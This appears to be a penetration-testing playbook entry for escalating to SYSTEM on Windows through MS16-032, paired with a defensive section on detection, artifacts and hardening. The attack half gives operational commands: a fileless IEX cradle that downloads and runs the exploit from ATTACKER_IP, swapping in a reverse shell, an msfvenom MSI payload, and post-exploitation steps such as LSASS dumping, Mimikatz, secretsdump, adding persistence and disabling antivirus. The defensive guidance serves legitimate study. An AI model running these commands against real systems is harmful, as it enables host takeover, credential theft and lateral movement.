notes:
=== Attack Chain: MS16-032 Secondary Logon → SYSTEM ===
Full chain using MS16-032 race condition in Secondary Logon service for privilege escalation.

=== CHAIN OVERVIEW ===
Foothold (any low-priv shell) → Confirm prerequisites → MS16-032 → SYSTEM → Post-exploitation

=== PREREQUISITE VERIFICATION ===
1. Multi-processor system (race condition requires >1 CPU):
   Get-WmiObject Win32_Processor | Select NumberOfCores,NumberOfLogicalProcessors
   Must have multiple logical processors — single-core VMs won't work reliably

2. Secondary Logon service running:
   sc query seclogon | findstr STATE
   Get-Service seclogon | Select Status
   Must be Running (not Stopped/Disabled)

3. Missing patch:
   wmic qfe list | findstr 3143141
   If absent → system may be vulnerable
   Watson: .\Watson.exe → automatically flags this

=== EXECUTION ===
Method 1 - IEX (fileless, no disk write):
  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-MS16-032.ps1')
  Invoke-MS16-032

Method 2 - Traditional import:
  Import-Module .\Invoke-MS16-032.ps1
  Invoke-MS16-032

Result: Spawns cmd.exe as NT AUTHORITY\SYSTEM in new window
Modify script to run reverse shell command instead of cmd.exe for non-GUI contexts

=== POST-EXPLOITATION CHAIN ===
SYSTEM → LSASS dump → transfer → Mimikatz → domain credentials
SYSTEM → secretsdump local → local admin hashes → lateral movement
SYSTEM → add persistence (new admin user, scheduled task, registry run key)
SYSTEM → disable AV → stage additional tools → deeper enumeration

=== COMMON FAILURE MODES ===
Race condition: may need multiple attempts (run 3-5 times if first attempt fails)
Single-core: won't work — verify processor count first
Patched: KB3143141 present → try other exploit paths (HiveNightmare, PrintNightmare, AlwaysInstallElevated)
PowerShell restricted: use IEX download cradle or compile to binary

=== CHAINING CONTEXT ===
Initial foothold (web shell, RCE, phishing) → MS16-032 → SYSTEM
SYSTEM → secretsdump → NTLM hashes → crackmapexec sweep → lateral movement
MS16-032 → SYSTEM → domain escalation when combined with Kerberoasting/ASREP results
Backup path when Potato attacks are patched (no SeImpersonate) and no kernel CVEs are available

defense.why_it_works: MS16-032 abuses a race condition in the Windows Secondary Logon (seclogon) service: it fails to properly sanitize thread handles, letting a low-privileged user duplicate a SYSTEM token onto a thread they control. Reliable on unpatched Win7-10 / Server 2008-2012 with 2+ CPU cores.
defense.prerequisites: A foothold as a low-privileged user on a host missing the MS16-032 patch, with 2+ CPU cores, and PowerShell available.
defense.impact: Local privilege escalation to SYSTEM — enough to add a local administrator account or spawn a SYSTEM-level shell, fully controlling the host.
defense.detection: [MITRE T1068 AN1419] Detects exploitation attempts targeting vulnerable OS components, often followed by unusual process or token behavior. Watch for a low-privileged process spawning a SYSTEM child, and for in-memory PowerShell download-and-execute (IEX (New-Object Net.WebClient).DownloadString). PowerShell script-block logging (Event 4104) captures Invoke-MS16-032.
defense.artifacts: A new local admin account and its Event 4720 (account created) / 4732 (added to Administrators); PowerShell IEX in-memory execution; a SYSTEM process parented by a user process; encoded-command (-Enc) PowerShell if the reverse-shell path is used.
defense.prevention: Apply the MS16-032 security update (the definitive fix). [MITRE T1068 M1051 Update Software] keep systems patched; [M1038 Execution Prevention] and [M1048 Application Isolation and Sandboxing] limit exploit impact; use application control (WDAC/AppLocker) to block unauthorized PowerShell tooling.
defense.evasion: The PoC runs entirely in memory (IEX DownloadString) to avoid writing to disk and dodge on-disk AV; the reverse-shell variant uses an encoded (-Enc) command to obscure the payload.
defense.misconfiguration: Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.
defense.vulnerable_config:
# AlwaysInstallElevated (any user installs MSI as SYSTEM):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi

# Service binary with weak DACL:
icacls C:\Program Files\VulnSvc\svc.exe
# BUILTIN\Users:(F)  <-- any user has Full Control -> replace with malicious binary
defense.secure_config:
# Disable AlwaysInstallElevated:
# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer
#   'Always install with elevated privileges' = Disabled
# Registry (both keys required):
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -Value 0
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -Value 0

# Fix service binary DACLs:
icacls 'C:\Program Files\VulnSvc\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\SYSTEM:(F)' 'BUILTIN\Administrators:(F)'
# Remove all non-admin write permissions

# Audit with PowerUp or PrivescCheck:
# Invoke-PrivescCheck -Thorough  # comprehensive privesc surface audit
# Run monthly and after any software installation
